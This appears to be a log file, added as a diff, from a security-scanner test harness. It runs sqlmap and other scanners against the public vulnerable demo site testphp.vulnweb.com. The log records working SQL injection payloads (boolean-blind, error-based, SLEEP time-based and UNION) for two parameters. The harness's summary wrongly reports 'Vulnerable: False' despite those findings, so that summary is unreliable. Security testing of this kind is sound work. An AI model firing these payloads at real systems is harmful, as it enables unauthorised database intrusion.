@@ -1,0 +1,465 @@
+2025-03-22 22:07:44,480 - INFO - security_api - Logger initialized with level: 20
+2025-03-22 22:07:44,495 - INFO - root - Created results folder
+2025-03-22 22:07:44,495 - INFO - security_api.sqlmap_test - Starting SQLMap scan test...
+2025-03-22 22:07:44,496 - INFO - root - Scanning URL: http://testphp.vulnweb.com/artists.php?artist=1
+2025-03-22 22:07:44,496 - INFO - root - Starting SQLMap scan...
+2025-03-22 22:07:46,968 - INFO - root - ___
+2025-03-22 22:07:46,968 - INFO - root - __H__
+2025-03-22 22:07:46,969 - INFO - root - ___ ___[)]_____ ___ ___  {1.9.2#pip}
+2025-03-22 22:07:46,969 - INFO - root - |_ -| . [)]     | .'| . |
+2025-03-22 22:07:46,970 - INFO - root - |___|_  [,]_|_|_|__,|  _|
+2025-03-22 22:07:46,970 - INFO - root - |_|V...       |_|   https://sqlmap.org
+2025-03-22 22:07:46,970 - INFO - root - 
+2025-03-22 22:07:46,980 - INFO - root - [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+2025-03-22 22:07:46,981 - INFO - root - 
+2025-03-22 22:07:46,981 - INFO - root - [*] starting @ 22:07:46 /2025-03-22/
+2025-03-22 22:07:46,982 - INFO - root - 
+2025-03-22 22:07:47,025 - INFO - root - [22:07:47] [WARNING] using 'D:\development\SecPro\tests\results' as the output directory
+2025-03-22 22:07:47,065 - INFO - root - [22:07:47] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (X11; U; Linux i686; ja; rv:1.8.1.11) Gecko/20071128 Firefox/2.0.0.11 (Debian-2.0.0.11-1)' from file 'D:\development\secALL\v\Lib\site-packages\sqlmap\data\txt\user-agents.txt'
+2025-03-22 22:07:47,586 - INFO - root - [22:07:47] [INFO] testing connection to the target URL
+2025-03-22 22:07:48,294 - INFO - root - [22:07:48] [INFO] checking if the target is protected by some kind of WAF/IPS
+2025-03-22 22:07:49,339 - INFO - root - [22:07:49] [INFO] testing if the target URL content is stable
+2025-03-22 22:07:49,618 - INFO - root - [22:07:49] [INFO] target URL content is stable
+2025-03-22 22:07:49,619 - INFO - root - [22:07:49] [INFO] testing if GET parameter 'artist' is dynamic
+2025-03-22 22:07:50,037 - INFO - root - [22:07:50] [INFO] GET parameter 'artist' appears to be dynamic
+2025-03-22 22:07:50,429 - INFO - root - [22:07:50] [INFO] heuristic (basic) test shows that GET parameter 'artist' might be injectable (possible DBMS: 'MySQL')
+2025-03-22 22:07:50,803 - INFO - root - [22:07:50] [INFO] heuristic (XSS) test shows that GET parameter 'artist' might be vulnerable to cross-site scripting (XSS) attacks
+2025-03-22 22:07:50,806 - INFO - root - [22:07:50] [INFO] testing for SQL injection on GET parameter 'artist'
+2025-03-22 22:07:50,834 - INFO - root - [22:07:50] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+2025-03-22 22:07:51,212 - INFO - root - [22:07:51] [WARNING] reflective value(s) found and filtering out
+2025-03-22 22:07:52,759 - INFO - root - [22:07:52] [INFO] GET parameter 'artist' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string="Sed")
+2025-03-22 22:07:52,759 - INFO - root - [22:07:52] [INFO] testing 'Generic inline queries'
+2025-03-22 22:07:53,122 - INFO - root - [22:07:53] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
+2025-03-22 22:07:53,489 - INFO - root - [22:07:53] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
+2025-03-22 22:07:53,855 - INFO - root - [22:07:53] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
+2025-03-22 22:07:54,247 - INFO - root - [22:07:54] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
+2025-03-22 22:07:54,606 - INFO - root - [22:07:54] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
+2025-03-22 22:07:54,976 - INFO - root - [22:07:54] [INFO] GET parameter 'artist' is 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)' injectable
+2025-03-22 22:07:54,977 - INFO - root - [22:07:54] [INFO] testing 'MySQL inline queries'
+2025-03-22 22:07:55,347 - INFO - root - [22:07:55] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
+2025-03-22 22:08:00,528 - INFO - root - [22:07:55] [WARNING] time-based comparison requires larger statistical model, please wait............... (done)
+2025-03-22 22:08:00,892 - INFO - root - [22:08:00] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
+2025-03-22 22:08:01,280 - INFO - root - [22:08:01] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
+2025-03-22 22:08:01,763 - INFO - root - [22:08:01] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
+2025-03-22 22:08:02,137 - INFO - root - [22:08:02] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
+2025-03-22 22:08:02,499 - INFO - root - [22:08:02] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
+2025-03-22 22:08:02,861 - INFO - root - [22:08:02] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
+2025-03-22 22:08:13,974 - INFO - root - [22:08:13] [INFO] GET parameter 'artist' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable
+2025-03-22 22:08:13,976 - INFO - root - [22:08:13] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
+2025-03-22 22:08:13,977 - INFO - root - [22:08:13] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
+2025-03-22 22:08:14,717 - INFO - root - [22:08:14] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
+2025-03-22 22:08:16,154 - INFO - root - [22:08:16] [INFO] target URL appears to have 3 columns in query
+2025-03-22 22:08:18,725 - INFO - root - [22:08:18] [INFO] GET parameter 'artist' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
+2025-03-22 22:08:19,107 - INFO - root - sqlmap identified the following injection point(s) with a total of 50 HTTP(s) requests:
+2025-03-22 22:08:19,108 - INFO - root - ---
+2025-03-22 22:08:19,109 - INFO - root - Parameter: artist (GET)
+2025-03-22 22:08:19,109 - INFO - root - Type: boolean-based blind
+2025-03-22 22:08:19,110 - INFO - root - Title: AND boolean-based blind - WHERE or HAVING clause
+2025-03-22 22:08:19,110 - INFO - root - Payload: artist=1 AND 8260=8260
+2025-03-22 22:08:19,110 - INFO - root - 
+2025-03-22 22:08:19,111 - INFO - root - Type: error-based
+2025-03-22 22:08:19,111 - INFO - root - Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
+2025-03-22 22:08:19,111 - INFO - root - Payload: artist=1 AND GTID_SUBSET(CONCAT(0x71716b7171,(SELECT (ELT(3128=3128,1))),0x716b717071),3128)
+2025-03-22 22:08:19,112 - INFO - root - 
+2025-03-22 22:08:19,112 - INFO - root - Type: time-based blind
+2025-03-22 22:08:19,112 - INFO - root - Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+2025-03-22 22:08:19,113 - INFO - root - Payload: artist=1 AND (SELECT 3723 FROM (SELECT(SLEEP(5)))fegO)
+2025-03-22 22:08:19,113 - INFO - root - 
+2025-03-22 22:08:19,114 - INFO - root - Type: UNION query
+2025-03-22 22:08:19,114 - INFO - root - Title: Generic UNION query (NULL) - 3 columns
+2025-03-22 22:08:19,114 - INFO - root - Payload: artist=-9946 UNION ALL SELECT NULL,CONCAT(0x71716b7171,0x64494243714a73597269544e4e584c6b7361486b696a58504d445264764c55574c73465a75447272,0x716b717071),NULL-- -
+2025-03-22 22:08:19,115 - INFO - root - ---
+2025-03-22 22:08:19,116 - INFO - root - [22:08:19] [INFO] the back-end DBMS is MySQL
+2025-03-22 22:08:21,424 - INFO - root - web server operating system: Linux Ubuntu
+2025-03-22 22:08:21,425 - INFO - root - web application technology: Nginx 1.19.0, PHP 5.6.40
+2025-03-22 22:08:21,426 - INFO - root - back-end DBMS: MySQL >= 5.6
+2025-03-22 22:08:21,426 - INFO - root - [22:08:21] [INFO] fetched data logged to text files under 'D:\development\SecPro\tests\results\testphp.vulnweb.com'
+2025-03-22 22:08:21,427 - INFO - root - 
+2025-03-22 22:08:21,427 - INFO - root - [*] ending @ 22:08:21 /2025-03-22/
+2025-03-22 22:08:21,427 - INFO - root - 
+2025-03-22 22:08:21,510 - INFO - root - Scanning URL: http://testphp.vulnweb.com/listproducts.php?cat=1
+2025-03-22 22:08:21,510 - INFO - root - Starting SQLMap scan...
+2025-03-22 22:08:22,569 - INFO - root - ___
+2025-03-22 22:08:22,569 - INFO - root - __H__
+2025-03-22 22:08:22,570 - INFO - root - ___ ___[)]_____ ___ ___  {1.9.2#pip}
+2025-03-22 22:08:22,570 - INFO - root - |_ -| . [.]     | .'| . |
+2025-03-22 22:08:22,570 - INFO - root - |___|_  [)]_|_|_|__,|  _|
+2025-03-22 22:08:22,571 - INFO - root - |_|V...       |_|   https://sqlmap.org
+2025-03-22 22:08:22,571 - INFO - root - 
+2025-03-22 22:08:22,580 - INFO - root - [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+2025-03-22 22:08:22,580 - INFO - root - 
+2025-03-22 22:08:22,581 - INFO - root - [*] starting @ 22:08:22 /2025-03-22/
+2025-03-22 22:08:22,581 - INFO - root - 
+2025-03-22 22:08:22,627 - INFO - root - [22:08:22] [WARNING] using 'D:\development\SecPro\tests\results' as the output directory
+2025-03-22 22:08:22,643 - INFO - root - [22:08:22] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.67 Safari/537.36' from file 'D:\development\secALL\v\Lib\site-packages\sqlmap\data\txt\user-agents.txt'
+2025-03-22 22:08:23,244 - INFO - root - [22:08:23] [INFO] testing connection to the target URL
+2025-03-22 22:08:23,953 - INFO - root - [22:08:23] [INFO] checking if the target is protected by some kind of WAF/IPS
+2025-03-22 22:08:24,389 - INFO - root - [22:08:24] [INFO] testing if the target URL content is stable
+2025-03-22 22:08:24,677 - INFO - root - [22:08:24] [INFO] target URL content is stable
+2025-03-22 22:08:24,678 - INFO - root - [22:08:24] [INFO] testing if GET parameter 'cat' is dynamic
+2025-03-22 22:08:25,078 - INFO - root - [22:08:25] [INFO] GET parameter 'cat' appears to be dynamic
+2025-03-22 22:08:25,468 - INFO - root - [22:08:25] [INFO] heuristic (basic) test shows that GET parameter 'cat' might be injectable (possible DBMS: 'MySQL')
+2025-03-22 22:08:25,841 - INFO - root - [22:08:25] [INFO] heuristic (XSS) test shows that GET parameter 'cat' might be vulnerable to cross-site scripting (XSS) attacks
+2025-03-22 22:08:25,844 - INFO - root - [22:08:25] [INFO] testing for SQL injection on GET parameter 'cat'
+2025-03-22 22:08:25,873 - INFO - root - [22:08:25] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+2025-03-22 22:08:26,271 - INFO - root - [22:08:26] [WARNING] reflective value(s) found and filtering out
+2025-03-22 22:08:27,798 - INFO - root - [22:08:27] [INFO] GET parameter 'cat' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string="Sed")
+2025-03-22 22:08:27,799 - INFO - root - [22:08:27] [INFO] testing 'Generic inline queries'
+2025-03-22 22:08:28,159 - INFO - root - [22:08:28] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
+2025-03-22 22:08:28,534 - INFO - root - [22:08:28] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
+2025-03-22 22:08:28,891 - INFO - root - [22:08:28] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
+2025-03-22 22:08:29,272 - INFO - root - [22:08:29] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
+2025-03-22 22:08:29,715 - INFO - root - [22:08:29] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
+2025-03-22 22:08:30,084 - INFO - root - [22:08:30] [INFO] GET parameter 'cat' is 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)' injectable
+2025-03-22 22:08:30,085 - INFO - root - [22:08:30] [INFO] testing 'MySQL inline queries'
+2025-03-22 22:08:30,456 - INFO - root - [22:08:30] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
+2025-03-22 22:08:34,913 - INFO - root - [22:08:30] [WARNING] time-based comparison requires larger statistical model, please wait............... (done)
+2025-03-22 22:08:35,509 - INFO - root - [22:08:35] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
+2025-03-22 22:08:35,876 - INFO - root - [22:08:35] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
+2025-03-22 22:08:36,238 - INFO - root - [22:08:36] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
+2025-03-22 22:08:36,595 - INFO - root - [22:08:36] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
+2025-03-22 22:08:36,968 - INFO - root - [22:08:36] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
+2025-03-22 22:08:37,333 - INFO - root - [22:08:37] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
+2025-03-22 22:08:48,416 - INFO - root - [22:08:48] [INFO] GET parameter 'cat' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable
+2025-03-22 22:08:48,417 - INFO - root - [22:08:48] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
+2025-03-22 22:08:48,418 - INFO - root - [22:08:48] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
+2025-03-22 22:08:49,226 - INFO - root - [22:08:49] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
+2025-03-22 22:08:51,414 - INFO - root - [22:08:51] [INFO] target URL appears to have 11 columns in query
+2025-03-22 22:08:52,286 - INFO - root - [22:08:52] [INFO] GET parameter 'cat' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
+2025-03-22 22:08:52,547 - INFO - root - sqlmap identified the following injection point(s) with a total of 48 HTTP(s) requests:
+2025-03-22 22:08:52,549 - INFO - root - ---
+2025-03-22 22:08:52,549 - INFO - root - Parameter: cat (GET)
+2025-03-22 22:08:52,549 - INFO - root - Type: boolean-based blind
+2025-03-22 22:08:52,549 - INFO - root - Title: AND boolean-based blind - WHERE or HAVING clause
+2025-03-22 22:08:52,550 - INFO - root - Payload: cat=1 AND 9618=9618
+2025-03-22 22:08:52,550 - INFO - root - 
+2025-03-22 22:08:52,550 - INFO - root - Type: error-based
+2025-03-22 22:08:52,551 - INFO - root - Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
+2025-03-22 22:08:52,551 - INFO - root - Payload: cat=1 AND GTID_SUBSET(CONCAT(0x717a706271,(SELECT (ELT(2151=2151,1))),0x717a627671),2151)
+2025-03-22 22:08:52,552 - INFO - root - 
+2025-03-22 22:08:52,552 - INFO - root - Type: time-based blind
+2025-03-22 22:08:52,552 - INFO - root - Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+2025-03-22 22:08:52,553 - INFO - root - Payload: cat=1 AND (SELECT 4628 FROM (SELECT(SLEEP(5)))GBry)
+2025-03-22 22:08:52,553 - INFO - root - 
+2025-03-22 22:08:52,554 - INFO - root - Type: UNION query
+2025-03-22 22:08:52,554 - INFO - root - Title: Generic UNION query (NULL) - 11 columns
+2025-03-22 22:08:52,554 - INFO - root - Payload: cat=1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x717a706271,0x71526a636c6b5275426748594d41414e7a68697a7a487757485a63485053576144766672546f5865,0x717a627671),NULL-- -
+2025-03-22 22:08:52,555 - INFO - root - ---
+2025-03-22 22:08:52,555 - INFO - root - [22:08:52] [INFO] the back-end DBMS is MySQL
+2025-03-22 22:08:54,413 - INFO - root - web server operating system: Linux Ubuntu
+2025-03-22 22:08:54,413 - INFO - root - web application technology: Nginx 1.19.0, PHP 5.6.40
+2025-03-22 22:08:54,413 - INFO - root - back-end DBMS: MySQL >= 5.6
+2025-03-22 22:08:54,413 - INFO - root - [22:08:54] [INFO] fetched data logged to text files under 'D:\development\SecPro\tests\results\testphp.vulnweb.com'
+2025-03-22 22:08:54,414 - INFO - root - 
+2025-03-22 22:08:54,414 - INFO - root - [*] ending @ 22:08:54 /2025-03-22/
+2025-03-22 22:08:54,414 - INFO - root - 
+2025-03-22 22:08:54,513 - INFO - security_api.sqlmap_test - Scan Results:
+2025-03-22 22:08:54,513 - INFO - security_api.sqlmap_test - 
+URL: http://testphp.vulnweb.com/artists.php?artist=1
+2025-03-22 22:08:54,514 - INFO - security_api.sqlmap_test - Vulnerable: False
+2025-03-22 22:08:54,514 - INFO - security_api.sqlmap_test - 
+URL: http://testphp.vulnweb.com/listproducts.php?cat=1
+2025-03-22 22:08:54,515 - INFO - security_api.sqlmap_test - Vulnerable: False
+2025-03-22 22:10:01,393 - INFO - security_api - Logger initialized with level: 20
+2025-03-22 22:10:01,399 - INFO - security_api.dalfox_test - Starting Dalfox scan test...
+2025-03-22 22:10:01,400 - INFO - root - Starting Dalfox scan with command: dalfox file dalfox_results\urls_testphp.vulnweb.com_20250322_221001.txt -o dalfox_results\dalfox_testphp.vulnweb.com_20250322_221001.txt --format json --silence --skip-bav --mass
+2025-03-22 22:10:22,159 - INFO - root - Dalfox scan completed successfully
+2025-03-22 22:10:22,160 - ERROR - security_api.dalfox_test - Error in Dalfox test: object tuple can't be used in 'await' expression
+2025-03-22 22:13:12,780 - INFO - security_api - Logger initialized with level: 20
+2025-03-22 22:13:12,785 - INFO - security_api.csrf_test - Starting CSRF scan test...
+2025-03-22 22:13:12,785 - INFO - security_api.csrf_test - 
+Scanning domain: testphp.vulnweb.com
+2025-03-22 22:13:12,787 - INFO - root - Starting CSRF scan for domain: testphp.vulnweb.com
+2025-03-22 22:13:34,464 - ERROR - root - Error in CSRF scan: HTTPSConnectionPool(host='testphp.vulnweb.com', port=443): Max retries exceeded with url: / (Caused by ConnectTimeoutError(<urllib3.connection.HTTPSConnection object at 0x0000026F2F2647D0>, 'Connection to testphp.vulnweb.com timed out. (connect timeout=None)'))
+2025-03-22 22:13:34,465 - ERROR - root - Error in CSRF scan: HTTPSConnectionPool(host='testphp.vulnweb.com', port=443): Max retries exceeded with url: / (Caused by ConnectTimeoutError(<urllib3.connection.HTTPSConnection object at 0x0000026F2F2647D0>, 'Connection to testphp.vulnweb.com timed out. (connect timeout=None)'))
+2025-03-22 22:13:34,467 - ERROR - security_api.csrf_test - Error in CSRF test: HTTPSConnectionPool(host='testphp.vulnweb.com', port=443): Max retries exceeded with url: / (Caused by ConnectTimeoutError(<urllib3.connection.HTTPSConnection object at 0x0000026F2F2647D0>, 'Connection to testphp.vulnweb.com timed out. (connect timeout=None)'))
+2025-03-22 22:13:45,334 - INFO - security_api - Logger initialized with level: 20
+2025-03-22 22:13:45,343 - INFO - security_api.ssrf_test - Starting SSRF scan test...
+2025-03-22 22:13:45,345 - INFO - root - Starting SSRF scan for 3 URLs
+2025-03-22 22:13:45,347 - INFO - security_api.ssrf_test - Scan Results:
+2025-03-22 22:13:45,347 - ERROR - security_api.ssrf_test - Error in SSRF test: 'list' object has no attribute 'items'
+2025-03-22 22:16:02,045 - INFO - security_api - Logger initialized with level: 20
+2025-03-22 22:16:02,052 - INFO - security_api.sqlmap_test - Starting SQLMap scan test...
+2025-03-22 22:16:02,053 - INFO - root - Scanning URL: http://testphp.vulnweb.com/artists.php?artist=1
+2025-03-22 22:16:02,053 - INFO - root - Starting SQLMap scan...
+2025-03-22 22:16:03,444 - INFO - root - ___
+2025-03-22 22:16:03,445 - INFO - root - __H__
+2025-03-22 22:16:03,445 - INFO - root - ___ ___[.]_____ ___ ___  {1.9.2#pip}
+2025-03-22 22:16:03,445 - INFO - root - |_ -| . ["]     | .'| . |
+2025-03-22 22:16:03,446 - INFO - root - |___|_  [']_|_|_|__,|  _|
+2025-03-22 22:16:03,446 - INFO - root - |_|V...       |_|   https://sqlmap.org
+2025-03-22 22:16:03,446 - INFO - root - 
+2025-03-22 22:16:03,457 - INFO - root - [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+2025-03-22 22:16:03,458 - INFO - root - 
+2025-03-22 22:16:03,459 - INFO - root - [*] starting @ 22:16:03 /2025-03-22/
+2025-03-22 22:16:03,459 - INFO - root - 
+2025-03-22 22:16:03,501 - INFO - root - [22:16:03] [WARNING] using 'D:\development\SecPro\tests\results' as the output directory
+2025-03-22 22:16:03,525 - INFO - root - [22:16:03] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.1b3pre) Gecko/20090213 Firefox/3.0.1b3pre' from file 'D:\development\secALL\v\Lib\site-packages\sqlmap\data\txt\user-agents.txt'
+2025-03-22 22:16:03,586 - INFO - root - [22:16:03] [INFO] resuming back-end DBMS 'mysql'
+2025-03-22 22:16:04,172 - INFO - root - [22:16:04] [INFO] testing connection to the target URL
+2025-03-22 22:16:04,780 - INFO - root - sqlmap resumed the following injection point(s) from stored session:
+2025-03-22 22:16:04,781 - INFO - root - ---
+2025-03-22 22:16:04,782 - INFO - root - Parameter: artist (GET)
+2025-03-22 22:16:04,782 - INFO - root - Type: boolean-based blind
+2025-03-22 22:16:04,782 - INFO - root - Title: AND boolean-based blind - WHERE or HAVING clause
+2025-03-22 22:16:04,783 - INFO - root - Payload: artist=1 AND 8260=8260
+2025-03-22 22:16:04,783 - INFO - root - 
+2025-03-22 22:16:04,784 - INFO - root - Type: error-based
+2025-03-22 22:16:04,784 - INFO - root - Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
+2025-03-22 22:16:04,784 - INFO - root - Payload: artist=1 AND GTID_SUBSET(CONCAT(0x71716b7171,(SELECT (ELT(3128=3128,1))),0x716b717071),3128)
+2025-03-22 22:16:04,786 - INFO - root - 
+2025-03-22 22:16:04,786 - INFO - root - Type: time-based blind
+2025-03-22 22:16:04,786 - INFO - root - Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+2025-03-22 22:16:04,787 - INFO - root - Payload: artist=1 AND (SELECT 3723 FROM (SELECT(SLEEP(5)))fegO)
+2025-03-22 22:16:04,787 - INFO - root - 
+2025-03-22 22:16:04,787 - INFO - root - Type: UNION query
+2025-03-22 22:16:04,788 - INFO - root - Title: Generic UNION query (NULL) - 3 columns
+2025-03-22 22:16:04,788 - INFO - root - Payload: artist=-9946 UNION ALL SELECT NULL,CONCAT(0x71716b7171,0x64494243714a73597269544e4e584c6b7361486b696a58504d445264764c55574c73465a75447272,0x716b717071),NULL-- -
+2025-03-22 22:16:04,789 - INFO - root - ---
+2025-03-22 22:16:04,789 - INFO - root - [22:16:04] [INFO] the back-end DBMS is MySQL
+2025-03-22 22:16:04,790 - INFO - root - web server operating system: Linux Ubuntu
+2025-03-22 22:16:04,790 - INFO - root - web application technology: Nginx 1.19.0, PHP 5.6.40
+2025-03-22 22:16:04,791 - INFO - root - back-end DBMS: MySQL >= 5.6
+2025-03-22 22:16:04,791 - INFO - root - [22:16:04] [INFO] fetched data logged to text files under 'D:\development\SecPro\tests\results\testphp.vulnweb.com'
+2025-03-22 22:16:04,792 - INFO - root - 
+2025-03-22 22:16:04,793 - INFO - root - [*] ending @ 22:16:04 /2025-03-22/
+2025-03-22 22:16:04,793 - INFO - root - 
+2025-03-22 22:16:04,894 - INFO - root - Scanning URL: http://testphp.vulnweb.com/listproducts.php?cat=1
+2025-03-22 22:16:04,895 - INFO - root - Starting SQLMap scan...
+2025-03-22 22:16:06,005 - INFO - root - ___
+2025-03-22 22:16:06,005 - INFO - root - __H__
+2025-03-22 22:16:06,006 - INFO - root - ___ ___["]_____ ___ ___  {1.9.2#pip}
+2025-03-22 22:16:06,006 - INFO - root - |_ -| . [)]     | .'| . |
+2025-03-22 22:16:06,006 - INFO - root - |___|_  [(]_|_|_|__,|  _|
+2025-03-22 22:16:06,007 - INFO - root - |_|V...       |_|   https://sqlmap.org
+2025-03-22 22:16:06,007 - INFO - root - 
+2025-03-22 22:16:06,016 - INFO - root - [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+2025-03-22 22:16:06,017 - INFO - root - 
+2025-03-22 22:16:06,017 - INFO - root - [*] starting @ 22:16:06 /2025-03-22/
+2025-03-22 22:16:06,018 - INFO - root - 
+2025-03-22 22:16:06,064 - INFO - root - [22:16:06] [WARNING] using 'D:\development\SecPro\tests\results' as the output directory
+2025-03-22 22:16:06,082 - INFO - root - [22:16:06] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; sv-se) AppleWebKit/417.9 (KHTML, like Gecko) Safari/417.8_Adobe' from file 'D:\development\secALL\v\Lib\site-packages\sqlmap\data\txt\user-agents.txt'
+2025-03-22 22:16:06,136 - INFO - root - [22:16:06] [INFO] resuming back-end DBMS 'mysql'
+2025-03-22 22:16:06,147 - INFO - root - [22:16:06] [INFO] testing connection to the target URL
+2025-03-22 22:16:06,722 - INFO - root - sqlmap resumed the following injection point(s) from stored session:
+2025-03-22 22:16:06,723 - INFO - root - ---
+2025-03-22 22:16:06,723 - INFO - root - Parameter: cat (GET)
+2025-03-22 22:16:06,723 - INFO - root - Type: boolean-based blind
+2025-03-22 22:16:06,724 - INFO - root - Title: AND boolean-based blind - WHERE or HAVING clause
+2025-03-22 22:16:06,724 - INFO - root - Payload: cat=1 AND 9618=9618
+2025-03-22 22:16:06,724 - INFO - root - 
+2025-03-22 22:16:06,725 - INFO - root - Type: error-based
+2025-03-22 22:16:06,725 - INFO - root - Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
+2025-03-22 22:16:06,725 - INFO - root - Payload: cat=1 AND GTID_SUBSET(CONCAT(0x717a706271,(SELECT (ELT(2151=2151,1))),0x717a627671),2151)
+2025-03-22 22:16:06,727 - INFO - root - 
+2025-03-22 22:16:06,727 - INFO - root - Type: time-based blind
+2025-03-22 22:16:06,727 - INFO - root - Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+2025-03-22 22:16:06,728 - INFO - root - Payload: cat=1 AND (SELECT 4628 FROM (SELECT(SLEEP(5)))GBry)
+2025-03-22 22:16:06,728 - INFO - root - 
+2025-03-22 22:16:06,729 - INFO - root - Type: UNION query
+2025-03-22 22:16:06,729 - INFO - root - Title: Generic UNION query (NULL) - 11 columns
+2025-03-22 22:16:06,729 - INFO - root - Payload: cat=1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x717a706271,0x71526a636c6b5275426748594d41414e7a68697a7a487757485a63485053576144766672546f5865,0x717a627671),NULL-- -
+2025-03-22 22:16:06,730 - INFO - root - ---
+2025-03-22 22:16:06,730 - INFO - root - [22:16:06] [INFO] the back-end DBMS is MySQL
+2025-03-22 22:16:06,730 - INFO - root - web server operating system: Linux Ubuntu
+2025-03-22 22:16:06,731 - INFO - root - web application technology: PHP 5.6.40, Nginx 1.19.0
+2025-03-22 22:16:06,731 - INFO - root - back-end DBMS: MySQL >= 5.6
+2025-03-22 22:16:06,731 - INFO - root - [22:16:06] [INFO] fetched data logged to text files under 'D:\development\SecPro\tests\results\testphp.vulnweb.com'
+2025-03-22 22:16:06,732 - INFO - root - 
+2025-03-22 22:16:06,732 - INFO - root - [*] ending @ 22:16:06 /2025-03-22/
+2025-03-22 22:16:06,732 - INFO - root - 
+2025-03-22 22:16:06,815 - INFO - root - Scanning URL: http://testphp.vulnweb.com/product.php?pic=1
+2025-03-22 22:16:06,815 - INFO - root - Starting SQLMap scan...
+2025-03-22 22:16:07,875 - INFO - root - ___
+2025-03-22 22:16:07,875 - INFO - root - __H__
+2025-03-22 22:16:07,875 - INFO - root - ___ ___[.]_____ ___ ___  {1.9.2#pip}
+2025-03-22 22:16:07,876 - INFO - root - |_ -| . [)]     | .'| . |
+2025-03-22 22:16:07,876 - INFO - root - |___|_  ["]_|_|_|__,|  _|
+2025-03-22 22:16:07,876 - INFO - root - |_|V...       |_|   https://sqlmap.org
+2025-03-22 22:16:07,877 - INFO - root - 
